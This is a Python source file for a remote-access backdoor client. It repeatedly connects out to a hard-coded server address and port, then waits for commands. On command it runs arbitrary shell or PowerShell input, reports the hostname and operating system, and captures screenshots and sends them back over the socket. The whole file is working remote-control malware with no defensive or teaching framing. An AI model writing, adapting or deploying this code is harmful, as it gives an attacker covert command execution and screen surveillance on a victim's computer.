import socket
import subprocess
import pyautogui
import platform
import time
import atexit

IP = "127.0.0.1"
PORT = 12364
RETRY_TIME = 0.1

def connect_to_server():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((IP, PORT))
            print(f"Connected to {IP}:{PORT}")
            return sock
        except (socket.error, KeyboardInterrupt):
            print(f"Failed to connect. Retrying in {RETRY_TIME} seconds...")
            time.sleep(RETRY_TIME)  

def handle_communication(sock):
    try:
        while True:
            try:
                data = sock.recv(1024).decode().lower()

                if data == "name":
                    sock.send(socket.gethostname().encode())
                elif data == "exit":
                    sock.close()
                    break
                elif data == "getos":
                    os_name = platform.system()
                    sock.send(os_name.encode())
                elif data.startswith("powershell"):
                    try:
                        process = subprocess.Popen(
                            ['powershell', '-command', data.split(" ", 1)[1]],
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            text=True
                        )
                        stdout, stderr = process.communicate()

                        if stdout:
                            sock.send(stdout.encode())
                        elif stderr:
                            sock.send(stderr.encode())
                        else:
                            sock.send("PowerShell command executed, no output.".encode())
                    except Exception as e:
                        sock.send(f"Failed to execute PowerShell command: {str(e)}".encode())
                elif data == "screenshot":
                    try:
                        print("ez")
                        screenshot = pyautogui.screenshot("./screenshot.png")

                        with open('./screenshot.png', 'rb') as f:
                            file_data = f.read()
                            sock.sendall(len(file_data).to_bytes(4, 'big'))
                            sock.sendall(file_data)

                        sock.send("Screenshot sent.".encode())
                    except Exception as e:
                        sock.send(f"Failed to take screenshot: {str(e)}".encode())
                else:
                    try:
                        result = subprocess.run(data, shell=True, capture_output=True, text=True)
                        if result.stdout:
                            sock.send(result.stdout.encode())
                        elif result.stderr:
                            sock.send(result.stderr.encode())
                        else:
                            sock.send("Command executed, no output.".encode())
                    except Exception as e:
                        sock.send(f"Error executing command: {str(e)}".encode())
            except socket.error:
                print("Connection lost. Attempting to reconnect...")
                sock.close()
                return
    except KeyboardInterrupt:
        print("\nClosing socket.")
        sock.close()
        exit(0)

sock = connect_to_server()
atexit.register(sock)

while True:
    sock = connect_to_server()
    handle_communication(sock)
    
